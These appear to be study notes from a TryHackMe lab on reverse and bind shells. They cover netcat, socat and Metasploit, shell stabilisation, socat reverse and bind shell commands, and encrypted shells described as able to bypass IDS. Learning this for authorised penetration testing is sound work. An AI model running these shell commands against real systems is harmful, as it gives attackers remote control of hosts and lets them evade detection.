In the simplest possible terms, shells are what we use when interfacing with a Command Line environment (CLI). In other words, the common bash or sh programs in Linux are examples of shells, as are cmd.exe and Powershell on Windows. When targeting remote systems it is sometimes possible to force an application running on the server (such as a webserver, for example) to execute arbitrary code. When this happens, we want to use this initial access to obtain a shell running on the target.

In simple terms, we can force the remote server to:
- send us command line access to the server (a **reverse** shell)
- open up a port on the server which we can connect to in order to execute further commands (a **bind** shell)

## **Tools**
There are a variety of tools that we will be using to receive reverse shells and to send bind shells. In general terms, we need malicious shell code, as well as a way of interfacing with the resulting shell.

- **Netcat:**
Netcat is the traditional "Swiss Army Knife" of networking. It is used to manually perform all kinds of network interactions, including things like banner grabbing during enumeration, but more importantly for our uses, it can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system. Netcat shells are very unstable (easy to lose) by default, but can be improved by techniques that we will be covering in an upcoming task.

- **Socat:**
Socat is like netcat on steroids. It can do all of the same things, and _many_ more. Socat shells are usually more stable than netcat shells out of the box. In this sense it is vastly superior to netcat; however, there are two big catches:
1. The syntax is more difficult
2. Netcat is installed on virtually every Linux distribution by default. Socat is very rarely installed by default.

- **Metasploit -- multi/handler:**
The `exploit/multi/handler` module of the Metasploit framework is, like socat and netcat, used to receive reverse shells. Due to being part of the Metasploit framework, multi/handler provides a fully-fledged way to obtain stable shells, with a wide variety of further options to improve the caught shell. It's also the only way to interact with a _meterpreter_ shell, and is the easiest way to handle _staged_ payloads -- both of which we will look at in task 9.

- **Msfvenom:**
Like multi/handler, msfvenom is technically part of the Metasploit Framework, however, it is shipped as a standalone tool. Msfvenom is used to generate payloads on the fly. Whilst msfvenom can generate payloads other than reverse and bind shells, these are what we will be focusing on in this room. Msfvenom is an incredibly powerful tool, so we will go into its application in much more detail in a dedicated task.


Note:
	Aside from the tools we've already covered, there are some repositories of shells in many different languages. One of the most prominent of these is [Payloads all the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md). The PentestMonkey [Reverse Shell Cheatsheet](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) is also commonly used. In addition to these online resources, Kali Linux also comes pre-installed with a variety of web-shells located at `/usr/share/webshells`. The [SecLists repo](https://github.com/danielmiessler/SecLists), though primarily used for wordlists, also contains some very useful code for obtaining shells.

## **Types of Shell**
At a high level, we are interested in two kinds of shell when it comes to exploiting a target:
- **Reverse shells** are when the target is forced to execute code that connects _back_ to your computer. On your own computer you would use one of the tools mentioned in the previous task to set up a _listener_ which would be used to receive the connection. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell. This, however, will not be a problem on the TryHackMe network due to the method by which we connect into the network.
	![[Pasted image 20240817021926.png]]
	
- **Bind shells** are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.
	![[Pasted image 20240817021857.png]]
	
 Shells can be either _interactive_ or _non-interactive_:
 - Interactive:_ If you've used Powershell, Bash, Zsh, sh, or any other standard CLI environment then you will be used to  interactive shells. These allow you to interact with programs after executing them. For example, take the SSH login prompt below. Here you can see that it's asking _interactively_ that the user type either yes or no in order to continue the connection. This is an interactive program, which requires an interactive shell in order to run.	 ![[Pasted image 20240817021828.png]]

- Non-Interactive_ shells don't give you that luxury. In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly. Unfortunately, the majority of simple reverse and bind shells are non-interactive, which can make further exploitation trickier. Let's see what happens when we try to run SSH in a non-interactive shell:
  ![[Pasted image 20240817022115.png]]
  Notice that the `whoami` command (which is non-interactive) executes perfectly, but the `ssh` command (which _is_ interactive) gives us no output at all. As an interesting side note, the output of an interactive command _does_ go somewhere, however, figuring out **where** is an exercise for you to attempt on your own. Suffice to say that interactive programs do not work in non-interactive shells.

## **Netcat**
Netcat is the most basic tool in a pentester's toolkit when it comes to any kind of networking. With it we can do a wide variety of interesting things, but let's focus for now on shells.

_Reverse Shells_:
The syntax for starting a netcat listener using Linux is:
 `nc -nvlp <port-number>`
 
- **-l** is used to tell netcat that this will be a listener
- **-v** is used to request a verbose output
- **-n** tells netcat not to resolve host names or use DNS. Explaining this is outwith the scope of the room.
- **-p** indicates that the port specification will follow.

Note:
	Be aware that if you choose to use a port below 1024, you will need to use `sudo` when starting your listener. That said, it's often a good idea to use a well-known port number (80, 443 or 53 being good choices) as this is more likely to get past outbound firewall rules on the target.

_Bind Shells_:
If we are looking to obtain a bind shell on a target then we can assume that there is already a listener waiting for us on a chosen port of the target: all we need to do is connect to it:
`nc <target-ip> <chosen-port>`

Here we are using netcat to make an outbound connection to the target on our chosen port.

## **Netcat Shell Stabilisation**
These shells are very unstable by default. Pressing Ctrl + C kills the whole thing. They are non-interactive, and often have strange formatting errors. This is due to netcat "shells" really being processes running _inside_ a terminal, rather than being bonafide terminals in their own right. Fortunately, there are many ways to stabilise netcat shells on Linux systems. We'll be looking at three here. Stabilisation of Windows reverse shells tends to be significantly harder; however, the second technique that we'll be covering here is particularly useful for it.

### _Technique 1: Python_
1. The first thing to do is use `python -c 'import pty;pty.spawn("/bin/bash")'`, which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace `python` with `python2` or `python3` as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
2. Step two is: `export TERM=xterm` -- this will give us access to term commands such as `clear`.
3. Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use `stty raw -echo; fg`. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.
	![[Pasted image 20240817023417.png]]

Note:
	If the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type `reset` and press enter.

### _Technique 2: rlwrap
rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell_;_ however, s_ome_ manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with `sudo apt install rlwrap`.

To use rlwrap, we invoke a slightly different listener:

`rlwrap nc -lvnp <port>`  

Prepending our netcat listener with "rlwrap" gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use `stty raw -echo; fg` to stabilise and re-enter the shell.

###  _Technique 3: Socat_
The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80`), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (`wget <LOCAL-IP>/socat -O /tmp/socat`).


*Note:*
	With any of the above techniques, it's useful to be able to change your terminal tty size. This is something that your terminal will do automatically when using a regular shell; however, it must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.

First, open another terminal and run `stty -a`. This will give you a large stream of output. Note down the values for "rows" and columns:
![[Pasted image 20240817032330.png]]

Next, in your reverse/bind shell, type in: `stty rows <number>`  and `stty cols <number>`, filling in the numbers you got from running the command in your own terminal. This will change the registered width and height of the terminal, thus allowing programs such as text editors which rely on such information being accurate to correctly open.

## **Socat**
Socat is similar to netcat in some ways, but fundamentally different in many others. The easiest way to think about socat is as a connector between two points. This will essentially be a listening port and a file, or indeed, two listening ports.

- **_Reverse Shells_**
	Here's the syntax for a basic reverse shell listener in socat:  
	`socat TCP-L:<port> -`

On Windows we would use this command to connect back:
`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`

On a Linux target we would use the following command:
`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`

The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.

- **_Bind Shells_**
	We use this command on our attacking machine to connect to the waiting listener:
	`socat TCP:<TARGET-IP>:<TARGET-PORT> -`

On a Windows target we would use this command for our listener:
`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`

On a Linux target we would use the following command:
`socat TCP-L:<PORT> EXEC:"bash -li"`

We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.

### Fully stable Linux tty reverse shell
This will only work when the target is Linux, but is _significantly_ more stable. The following technique is perhaps one of its most useful applications. Here is the new listener syntax:

`socat TCP-L:<port> FILE:`tty`,raw,echo=0`

As usual, we're connecting two points together. In this case those points are a listening port, and a file. Specifically, we are passing in the current TTY as a file and setting the echo to be zero. This is approximately equivalent to using the Ctrl + Z, `stty raw -echo; fg` trick with a netcat shell -- with the added bonus of being immediately stable and hooking into a full tty.

The first listener can be connected to with any payload; however, this special listener must be activated with a very specific socat command. This means that the target must have socat installed. Most machines do not have socat installed by default, however, it's possible to upload a [precompiled socat binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true), which can then be executed as normal. The special command is as follows:

`socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li", pty, stderr, sigint, setsid, sane`

The first part is easy -- we're linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with  `EXEC:"bash -li"`. We're also passing the arguments: pty, stderr, sigint, setsid and sane:

- **pty**, allocates a pseudoterminal on the target -- part of the stabilisation process
- **stderr**, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)  
- **sigint**, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
- **setsid**, creates the process in a new session
- **sane**, stabilises the terminal, attempting to "normalise" it.

![[Pasted image 20240817172839.png]]

On the left we have a listener running on our local attacking machine, on the right we have a simulation of a compromised target, running with a non-interactive shell. Using the non-interactive netcat shell, we execute the special socat command, and receive a fully interactive bash shell on the socat listener to the left.

## **Socat Encrypted Shells**  
One of the many great things about socat is that it's capable of creating encrypted shells -- both bind and reverse. Why would we want to do this? Encrypted shells cannot be spied on unless you have the decryption key, and are often able to bypass an IDS as a result.

Suffice to say that any time `TCP` was used as part of a command, this should be replaced with `OPENSSL` when working with encrypted shells.

We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine.  This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.

`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`

We then need to merge the two created files into a single `.pem` file:
`cat shell.key shell.crt > shell.pem`

Now, when we set up our reverse shell listener, we use:
`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`

This sets up an OPENSSL listener using our generated certificate. `verify=0` tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. 

*Note:*
	The certificate _must_ be used on whichever device is listening.


To connect back, we would use:
`socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`

The same technique would apply for a bind shell:

Target:
`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`  

Attacker:
`socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`  

Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.


The following image shows an OPENSSL Reverse shell from a Linux target. The target is on the right, and the attacker is on the left:
![[Pasted image 20240817195522.png]]

Q) What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called “encrypt.pem”.

- (normal reverse shell )
	`socat TCP-L:53 FILE:tty,raw,echo=0`  

- (encrypted using openssl )
	`socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:tty,raw,echo=0` 

Q) If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?

- the regular syntax is this: 
  `socat TCP:10.10.10.5:53 EXEC:”bash -li”, pty, stderr, sigint, setsid, sane`

- encrypted using openssl:
  `socat OPENSSL:10.10.10.5:53,verify=0 EXEC:”bash -li”, pty, stderr, sigint, setsid, sane`
